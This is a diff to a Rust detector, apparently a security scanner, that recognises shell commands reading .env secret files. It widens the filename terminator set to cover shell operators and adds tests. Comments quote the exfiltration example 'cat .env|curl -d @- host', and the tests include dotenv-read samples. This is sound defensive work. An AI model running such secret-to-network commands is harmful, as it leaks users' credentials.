@@ -34,11 +34,29 @@ pub(crate) fn references_dotenv_file(lower: &str) -> bool {
         let abs = search_start + rel;
         let after = abs + ".env".len();
         let next = lower[after..].chars().next();
+        // Shell operators (`|`, `&`, `<`, `>`) are valid terminators too:
+        // `cat .env|curl -d @- host` (no intervening space) is a genuine
+        // dotenv read piped to exfil, so omitting them dropped the
+        // secret-to-network flow.
         let is_terminator = match next {
             None => true,
             Some(c) => matches!(
                 c,
-                '"' | '\'' | ' ' | '\t' | '\n' | '\r' | ':' | ',' | ')' | ';' | '`' | '.'
+                '"' | '\''
+                    | ' '
+                    | '\t'
+                    | '\n'
+                    | '\r'
+                    | ':'
+                    | ','
+                    | ')'
+                    | ';'
+                    | '`'
+                    | '.'
+                    | '|'
+                    | '&'
+                    | '<'
+                    | '>'
             ),
         };
         if is_terminator {
@@ -104,6 +122,30 @@ mod tests {
             assert!(
                 references_dotenv_file(&sample.to_ascii_lowercase()),
                 "must match genuine reference: {sample}"
+            );
+        }
+    }
+
+    /// # Contract
+    ///
+    /// A `.env` read immediately followed by a shell operator (no
+    /// intervening space — valid shell) is still a dotenv reference.
+    /// Pre-fix the terminator set omitted `|`, `&`, `<`, `>`, so
+    /// `cat .env|curl -d @- host` was not recognised and the
+    /// secret-to-network exfil flow was dropped. Lookalikes followed by
+    /// the same operators stay rejected.
+    #[test]
+    fn fires_on_dotenv_followed_by_shell_operator() {
+        for sample in ["cat .env|base64", "cat .env>out", "cat .env&", "cat .env<x"] {
+            assert!(
+                references_dotenv_file(&sample.to_ascii_lowercase()),
+                "must match dotenv before shell operator: {sample}"
+            );
+        }
+        for sample in ["cat .envrc|base64", "cat .envelope>out"] {
+            assert!(
+                !references_dotenv_file(&sample.to_ascii_lowercase()),
+                "lookalike before shell operator must stay rejected: {sample}"
             );
         }
     }
